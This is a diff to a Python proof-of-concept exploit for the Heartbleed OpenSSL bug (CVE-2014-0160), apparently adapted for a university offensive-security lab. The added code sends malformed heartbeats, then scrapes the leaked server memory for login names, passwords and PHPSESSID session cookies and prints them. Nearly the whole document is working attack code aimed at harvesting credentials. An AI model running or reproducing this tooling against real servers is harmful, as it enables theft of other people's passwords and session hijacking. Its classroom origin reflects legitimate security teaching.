@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# Quick demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code
 # Minor customizations by Malik Mesellem (@MME_IT)
 # New options added for the course Lab on Offensive Computer Security TU/e (2019):
@@ -69,12 +69,54 @@ hb = h2bin('''
 #              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes
 
 def consoleLog(msg, quiet):
-
     # Return without printing (if quite option specified by user)
     if quiet:
         return
 
     print(msg)
+
+def logList(list, name, color, quiet, delim = ''):
+    # Return without printing (if quite option specified by user)
+    if quiet:
+        return
+
+    # Build message string
+    # Use delim to detect whether we are printing cookies (cookies are printed on separate lines)
+    if delim == '\n':
+        header = color + name + colors.END + ': '
+        msg = ''
+    else:
+        header = ''
+        msg = color + name + colors.END + ': '
+
+    for item in list:
+        msg += header + item + ' ' + delim
+
+    print(msg)
+
+def skip(info, pos, stop):
+    while stop.find(info[pos]) == -1:
+        pos += 1
+    return pos
+
+# method extracts usernames, passwords and session ids (cookies) from leaked info
+def getCredentials(info, key):
+    items = []
+    i = info.index(key)
+    while i < len(info):
+        # Find next user from info string
+        i = skip(info, i, '=')
+        # Strip current user from info string
+        info = info[i+1:]
+        # Get username of current user (and add to users list)
+        i = skip(info, 0, '&.;')
+        items.append(info[:i])
+        # Strip current username from info string
+        info = info[i+1:]
+        i = len(info)
+        if info.find(key) != -1:
+            i = info.index(key)
+    return items
 
 def hexdump(s, file, quiet):
 
@@ -84,28 +126,38 @@ def hexdump(s, file, quiet):
         output = open(file, 'a')
 
     # Variables for detecting passwords and cookies in memory dump
-    _pwd = False;
-    _cookie = False;
+    hasPwd = False;
+    hasCookie = False;
+    info = ''
 
     for b in xrange(0, len(s), 16):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
 
+        info += pdat
+
         if pdat.find('pas'):
-            _pwd = True
+            hasPwd = True
         if pdat.find('Cookie'):
-            _cookie = True
+            hasCookie = True
 
         if len(file) > 0:
             output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
         else:
             consoleLog('  %04x: %-48s %s' % (b, hxdat, pdat), quiet)
 
+    # Get user names from leaked memory
+    users = getCredentials(info, 'login')
+    # Get user passwords from leaked memory
+    passwords = getCredentials(info, 'password')
+    # Get user cookie from leaked memory
+    cookies = getCredentials(info, 'PHPSESSID')
+
     if len(file) == 0 and not quiet:
         print
 
-    return _pwd, _cookie
+    return users, passwords, cookies, hasPwd, hasCookie
 
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
@@ -149,15 +201,26 @@ def hit_hb(s, file, quiet, pwd, cookie):
 
         if typ == 24:
             consoleLog('Received heartbeat response:', quiet)
-            _pwd, _cookie = hexdump(pay, file, quiet)
-            if _cookie and cookie:
-                consoleLog(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output.', quiet)
-            if _pwd and pwd:
-                consoleLog(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output.', quiet)
+            # Parse information from heartbeat response
+            users, passwords, cookies, hasPwd, hasCookie = hexdump(pay, file, quiet)
+
+            # Log to console the list of users
+            logList(users[1:], 'USERS', colors.OKBLUE, quiet)
+            # Log to console the list of passwords
+            logList(passwords, 'PASSWORDS', colors.OKBLUE, quiet)
+            # Log to console the list of cookies
+            logList(cookies, 'COOKIE', colors.OKBLUE, quiet, '\n')
+
+            if hasCookie and cookie:
+                consoleLog(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output', quiet)
+            if hasPwd and pwd:
+                consoleLog(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output', quiet)
+
             if len(pay) > 3:
                 consoleLog(colors.WARNING + 'WARNING: ' + colors.END + 'server returned more data than it should - server is vulnerable!', quiet)
             else:
                 consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'server processed malformed heartbeat, but did not return any extra data.', quiet)
+
             return True
 
         if typ == 21:
